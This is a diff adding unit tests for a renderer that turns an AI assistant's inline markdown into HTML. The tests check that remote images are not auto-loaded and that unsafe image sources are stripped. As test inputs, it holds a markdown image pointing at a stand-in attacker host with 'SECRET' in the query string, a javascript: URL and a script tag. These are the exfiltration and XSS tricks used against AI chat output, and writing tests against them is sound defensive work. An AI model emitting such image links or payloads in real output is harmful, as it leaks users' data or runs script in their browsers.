@@ -18,6 +18,36 @@ describe("formatAiInlineMarkdown", () => {
     expect(html).not.toContain("<a ");
   });
 
+  it("never auto-loads remote markdown images", () => {
+    const html = formatAiInlineMarkdown("![secret <b>](https://attacker.example/?d=SECRET)");
+
+    expect(html).not.toContain("<img");
+    expect(html).toContain('href="https://attacker.example/?d=SECRET"');
+    expect(html).toContain("secret &lt;b&gt;");
+  });
+
+  it("renders unsafe image sources as escaped alt text only", () => {
+    const html = formatAiInlineMarkdown('![alt "x"](javascript:alert(1))');
+
+    expect(html).not.toContain("<img");
+    expect(html).not.toContain("<a ");
+    expect(html).not.toContain("javascript:");
+    expect(html).toContain("alt &quot;x&quot;");
+  });
+
+  it("keeps inline raster data images", () => {
+    const html = formatAiInlineMarkdown("![dot](data:image/png;base64,iVBORw0KGgo=)");
+
+    expect(html).toContain('<img src="data:image/png;base64,iVBORw0KGgo="');
+    expect(html).toContain('alt="dot"');
+  });
+
+  it("does not inline svg data images", () => {
+    const html = formatAiInlineMarkdown("![x](data:image/svg+xml;base64,PHN2Zz4=)");
+
+    expect(html).not.toContain("<img");
+  });
+
   it("escapes raw html from assistant text", () => {
     const html = formatAiInlineMarkdown("<script>alert(1)</script>");
 
